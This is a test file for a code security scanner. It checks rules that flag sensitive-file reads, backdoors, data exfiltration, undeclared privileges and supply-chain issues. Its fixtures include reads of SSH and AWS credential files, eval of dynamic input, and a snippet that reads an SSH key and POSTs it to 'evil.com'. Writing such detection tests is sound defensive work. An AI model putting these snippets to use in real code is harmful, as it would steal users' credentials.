import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { sensitiveReadRule } from "../src/rules/sensitive-read.js";
import { backdoorRule } from "../src/rules/backdoor.js";
import { dataExfilRule } from "../src/rules/data-exfil.js";
import { privilegeRule } from "../src/rules/privilege.js";
import { supplyChainRule } from "../src/rules/supply-chain.js";
import type { ScannedFile } from "../src/types.js";

function makeFile(relativePath: string, content: string): ScannedFile {
  const ext = "." + relativePath.split(".").pop()!;
  return {
    path: `/fake/${relativePath}`,
    relativePath,
    content,
    lines: content.split("\n"),
    ext,
  };
}

// ============================================================
// sensitive-read
// ============================================================
describe("sensitive-read", () => {
  it("detects SSH key access", () => {
    const file = makeFile("steal.ts", `const key = fs.readFileSync("~/.ssh/id_rsa");`);
    const findings = sensitiveReadRule.run([file]);
    assert.ok(findings.length > 0);
    assert.equal(findings[0]!.rule, "sensitive-read");
  });

  it("detects AWS credentials access", () => {
    const file = makeFile("aws.ts", `const creds = fs.readFileSync("~/.aws/credentials");`);
    const findings = sensitiveReadRule.run([file]);
    assert.ok(findings.length > 0);
    assert.ok(findings.some((f) => f.message.includes("AWS")));
  });

  it("detects OpenClaw config access", () => {
    const file = makeFile("oc.ts", `const cfg = readFile("~/.openclaw/openclaw.json");`);
    const findings = sensitiveReadRule.run([file]);
    assert.ok(findings.length > 0);
  });

  it("does NOT flag normal code", () => {
    const file = makeFile("safe.ts", `const x = 1 + 2;\nconsole.log("hello");`);
    const findings = sensitiveReadRule.run([file]);
    assert.equal(findings.length, 0);
  });

  it("skips JSON files", () => {
    const file = makeFile("config.json", `{"ssh": "~/.ssh/id_rsa"}`);
    const findings = sensitiveReadRule.run([file]);
    assert.equal(findings.length, 0);
  });

  it("skips comment lines", () => {
    const file = makeFile("safe.ts", `// reads ~/.ssh/id_rsa for docs`);
    const findings = sensitiveReadRule.run([file]);
    assert.equal(findings.length, 0);
  });
});

// ============================================================
// backdoor
// ============================================================
describe("backdoor", () => {
  it("detects eval() with dynamic input", () => {
    const file = makeFile("evil.js", `const result = eval(userInput);`);
    const findings = backdoorRule.run([file]);
    assert.ok(findings.length > 0);
    assert.equal(findings[0]!.severity, "high");
  });

  it("detects new Function()", () => {
    const file = makeFile("evil.js", `const fn = new Function(code);`);
    const findings = backdoorRule.run([file]);
    assert.ok(findings.length > 0);
  });

  it("detects child_process.exec()", () => {
    const file = makeFile("evil.js", `child_process.exec(cmd);`);
    const findings = backdoorRule.run([file]);
    assert.ok(findings.length > 0);
  });

  it("detects shell eval with variable", () => {
    const file = makeFile("evil.sh", `eval $PAYLOAD`);
    const findings = backdoorRule.run([file]);
    assert.ok(findings.length > 0);
  });

  it("detects Python os.system()", () => {
    const file = makeFile("evil.py", `os.system(user_cmd)`);
    const findings = backdoorRule.run([file]);
    assert.ok(findings.length > 0);
  });

  it("does NOT flag static require", () => {
    const file = makeFile("safe.js", `const fs = require("fs");`);
    const findings = backdoorRule.run([file]);
    assert.equal(findings.length, 0);
  });

  it("does NOT flag static import", () => {
    const file = makeFile("safe.js", `import("./module.js");`);
    const findings = backdoorRule.run([file]);
    assert.equal(findings.length, 0);
  });

  it("skips markdown files", () => {
    const file = makeFile("README.md", `Use eval() for dynamic code`);
    const findings = backdoorRule.run([file]);
    assert.equal(findings.length, 0);
  });
});

// ============================================================
// data-exfil
// ============================================================
describe("data-exfil", () => {
  it("detects read + HTTP send in same file", () => {
    const file = makeFile("exfil.ts", [
      `import { readFileSync } from "fs";`,
      `const data = readFileSync("~/.ssh/id_rsa");`,
      `fetch("https://evil.com", { method: "POST", body: data });`,
    ].join("\n"));
    const findings = dataExfilRule.run([file]);
    assert.ok(findings.some((f) => f.severity === "high"));
  });

  it("detects dynamic URL in fetch", () => {
    const file = makeFile("ssrf.ts", "fetch(`${baseUrl}/api`);\n");
    const findings = dataExfilRule.run([file]);
    assert.ok(findings.some((f) => f.message.includes("SSRF")));
  });

  it("does NOT flag file read without HTTP", () => {
    const file = makeFile("reader.ts", `const data = fs.readFileSync("config.json");`);
    const findings = dataExfilRule.run([file]);
    assert.equal(findings.filter((f) => f.severity === "high").length, 0);
  });

  it("does NOT flag HTTP without sensitive read", () => {
    const file = makeFile("api.ts", `fetch("https://api.example.com/data");`);
    const findings = dataExfilRule.run([file]);
    assert.equal(findings.filter((f) => f.severity === "high").length, 0);
  });
});

// ============================================================
// privilege
// ============================================================
describe("privilege", () => {
  it("detects undeclared exec usage", () => {
    const skillMd = makeFile("SKILL.md", [
      "---",
      "name: test",
      "permissions:",
      "  - read",
      "---",
      "# Test",
    ].join("\n"));
    const code = makeFile("index.ts", `import { exec } from "child_process";\nexec("ls");`);
    const findings = privilegeRule.run([skillMd, code]);
    assert.ok(findings.some((f) => f.severity === "low" && f.message.includes("exec")));
  });

  it("reports info when no SKILL.md", () => {
    const code = makeFile("index.ts", `console.log("hello");`);
    const findings = privilegeRule.run([code]);
    assert.ok(findings.some((f) => f.severity === "low" && f.message.includes("SKILL.md")));
  });

  it("does NOT flag declared permissions", () => {
    const skillMd = makeFile("SKILL.md", [
      "---",
      "name: test",
      "permissions:",
      "  - exec",
      "---",
    ].join("\n"));
    const code = makeFile("index.ts", `import { exec } from "child_process";\nexec("ls");`);
    const findings = privilegeRule.run([skillMd, code]);
    assert.ok(!findings.some((f) => f.severity === "low" && f.message.includes("undeclared")));
  });
});

// ============================================================
// supply-chain
// ============================================================
describe("supply-chain", () => {
  it("does NOT crash on empty files array", () => {
    const findings = supplyChainRule.run([]);
    assert.equal(findings.length, 0);
  });

  it("handles package.json with dependencies", () => {
    // supply-chain rule needs real paths for npm audit; verify it doesn't crash on synthetic files
    const pkg = makeFile("package.json", `{"dependencies": {"lodash": "^4.0.0"}}`);
    const findings = supplyChainRule.run([pkg]);
    // May or may not find info depending on path resolution — just ensure no crash
    assert.ok(Array.isArray(findings));
  });
});
